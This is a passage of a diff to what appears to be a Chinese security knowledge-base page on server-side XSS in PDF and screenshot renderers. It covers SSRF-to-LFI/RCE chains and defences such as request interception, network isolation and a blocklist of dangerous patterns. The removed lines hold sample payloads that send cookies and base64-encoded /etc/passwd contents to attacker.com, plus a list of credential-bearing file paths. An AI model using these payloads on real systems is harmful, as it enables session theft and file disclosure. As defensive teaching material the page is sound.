-  __html: '<img src=x onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">'
-}} />
-
-// Vue Nuxt — v-html 在服务端渲染时同样不转义
-<div v-html="userInput"></div>
-```
-
-SSR 场景中的特殊考虑：Node.js 服务端可访问 `process.env`、文件系统模块等——如果 SSR payload 能触发 server-side code execution（例如通过 `require` 或 `eval`），影响远超 XSS。
-
----
-
-# 0x05 攻击链：SSRF → Server Side XSS → RCE/LFI
-
-## 5.1 完整攻击链模型
-
-```
-[外部攻击者]
-    │
-    ▼
-[Web 应用] ──用户可控 HTML 输入──→ [PDF/截图/渲染服务]
-    │                                    │
-    │                              ┌─────┴──────┐
-    │                              │ JS 执行:    │
-    │                              │ · file://   │ ← LFI
-    │                              │ · localhost  │ ← 内网扫描
-    │                              │ · 169.254    │ ← 云 metadata
-    │                              │ · DNS/HTTP   │ ← OOB 数据窃取
-    │                              └──────────────┘
-    ▼
-[攻击者 Collaborator] ←── 窃取的数据
-```
-
-## 5.2 SSRF 触发内部渲染服务
-
-许多组织中，PDF 生成/截图服务部署在内网作为微服务：
-
-```
-Nginx → App Server → http://pdf-service.internal:3000/render?html=...
-                              ↑ SSRF 可达的目标
-```
-
-如果攻击者通过 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) 发现 `pdf-service.internal:3000`，可向其投喂恶意 HTML，触发 Server Side XSS → 从内部读取云 metadata。
-
-## 5.3 本地文件读取 (LFI) 技术
-
-```html
-<!-- 读取 /etc/passwd（URL 编码绕过） -->
-<script>
-x = new XMLHttpRequest();
-x.onload = function() {
-    new Image().src = 'http://attacker.com/?d=' + btoa(x.responseText);
-};
-x.open("GET", "file:///etc/passwd");
-x.send();
-</script>
-
-<!-- 读取敏感配置文件 -->
-file:///proc/self/environ          # 环境变量（含 API Key）
-file:///proc/self/cwd/.env         # Node.js/Python .env
-file:///root/.bash_history         # 命令历史
-file:///var/run/docker.sock        # Docker socket（可能实现 RCE）
-```
-
-## 5.4 远程代码执行 (RCE) 路径
-
-| 路径 | 条件 | 技术 |
-|------|------|------|
-| wkhtmltopdf `--enable-local-file-access` + JS | 默认配置 | `file://` 读 + 外部 exfil |
-| Puppeteer `--no-sandbox` | Docker/K8s 部署 | Node.js `require` 逃逸 |
-| PDF.js CVE-2024-4367 | 未更新版本 | FontMatrix `c.transform` 通过 `new Function` 执行 |
-| ReportLab CVE-2023-33733 | 未更新版本 | 三重括号 `{{{ }}}` 表达式求值 |
-| PhantomJS (已废弃) | 遗留系统 | `require('child_process').exec()` |
-
----
-
-# 0x06 防御与缓解
-
-## 6.1 浏览器沙箱化
-
-```bash
-# wkhtmltopdf — 禁用危险特性
-wkhtmltopdf --disable-local-file-access \
-            --disable-javascript \
-            --no-stop-slow-scripts \
-            input.html output.pdf
-
-# Puppeteer — 沙箱模式
-const browser = await puppeteer.launch({
-    args: [
-        '--no-sandbox',                     // 仅在容器中需要
-        '--disable-setuid-sandbox',
-        '--disable-dev-shm-usage',
-        '--disable-gpu',
-        '--disable-web-security',           // ← 绝对禁止
-    ]
-});
-```
-
-关键 Puppeteer 安全配置：
-
-```javascript
-// 推荐的安全启动配置
-const browser = await puppeteer.launch({
-    args: ['--disable-web-security=false'], // 保持 web 安全
-    ignoreDefaultArgs: ['--disable-web-security'], // 禁止覆盖
-});
-
-const page = await browser.newPage();
-await page.setRequestInterception(true);
-page.on('request', (req) => {
-    const url = req.url();
-    // 阻止 file:// 和内部 IP 访问
-    if (url.startsWith('file://') ||
-        url.match(/^https?:\/\/(127\.|10\.|172\.1[6-9]|172\.2\d|172\.3[01]|192\.168|169\.254)/)) {
-        req.abort();
-    } else {
-        req.continue();
-    }
-});
-```
-
-## 6.2 网络层隔离
-
-```
-┌─────────────┐     ┌──────────────┐     ┌─────────────┐
-│  公网 App    │────→│  渲染微服务    │────→│  Collaborator│
-│             │     │  (独立 VPC)   │  ✗  │  file://     │
-│             │     │  (无外网出口)  │  ✗  │  localhost   │
-└─────────────┘     └──────────────┘  ✗  │  169.254     │
-                                         └─────────────┘
-```
-
-- 渲染服务放在独立网络段，无外网出口（阻止 OOB 数据窃取）
-- 静态 iptables/nftables 规则阻止 `file://` 协议和 metadata IP 的出站请求
-- 渲染服务不应有访问内网敏感服务的网络权限
-
-## 6.3 输入过滤与输出编码
-
-```python
-# 在 HTML 内容进入渲染引擎前过滤
-import re
-
-DANGEROUS_PATTERNS = [
-    r'file://',                          # 本地文件读取
-    r'169\.254\.169\.254',               # 云 metadata
-    r'<script[^>]*>',                    # Script 标签
-    r'onerror\s*=',                      # 事件处理器
-    r'onload\s*=',
-    r'<iframe[^>]*>',
-    r'<embed[^>]*>',
-    r'<object[^>]*>',
-    r'<meta[^>]*http-equiv',
-]
-
-def sanitize_html_content(html):
-    for pattern in DANGEROUS_PATTERNS:
-        html = re.sub(pattern, '', html, flags=re.IGNORECASE)
-    return html
-```
-
-> `re.sub` 黑名单过滤只是第一层防线。更安全的做法是使用 HTML 净化库（DOMPurify on server side、OWASP Java HTML Sanitizer）并配合严格的 CSP。
-
-## 6.4 运行时检测规则
-
-| 检测层 | 规则 |
-|--------|------|
-| **静态审计** | 搜索代码中 `page.setContent()` / `page.pdf()` / `wkhtmltopdf` 调用，检查用户输入是否直接传入 |
-| **流量分析** | 监控渲染服务向外部 IP 的 HTTP/DNS 请求（正常渲染不应产生） |
-| **文件访问** | `auditd` 监控渲染进程对 `/etc/`、`/proc/` 的读取操作 |
-| **PDF 结构** | 解析生成 PDF 的 `/JS`、`/OpenAction`、`/AA` 对象——这些不应出现在数据驱动的 PDF 中 |
-| **进程行为** | 渲染进程不应 fork 子进程或加载非渲染相关 `.so` 文件 |
-
----
+- 渲染器出站请求日志与告警（OAST 探测、外连 ping 特征）；异常多的逐端口请求（端口扫描载荷）应触发告警。
+- 对可下载的 PDF/报告产物抽查渲染内容，审计模板注入点（标题/用户名/文件名等数据字段）。
 
 ## 参考资料
 
-- [HackTricks — Server Side XSS (Dynamic PDF)](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)
-- [HackTricks — PDF Injection](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/pdf-injection.html)
-- [Gareth Heyes, "Portable Data exFiltration: XSS for PDFs" — PortSwigger Research](https://portswigger.net/research/portable-data-exfiltration)
-- [Thomas Rinsma, "CVE-2024-4367 — Arbitrary JavaScript execution in PDF.js"](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)
+- [hacktricks — Server Side XSS (Dynamic PDF)](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)
 - [buer.haus — Escalating XSS in PhantomJS Image Rendering to SSRF/Local File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
 - [noob.ninja — Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
-- [Intigriti — Exploiting PDF Generators: A Complete Guide to Finding SSRF Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators)
-- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
-- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [lbherrera — h1415 CTF Writeup](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
+- [infosecwriteups — Breaking Down SSRF on PDF Generation: A Pentesting Guide](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)
+- [Intigriti — Exploiting PDF Generators: A Complete Guide to Finding SSRF Vulnerabilities in PDF Generators](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators)
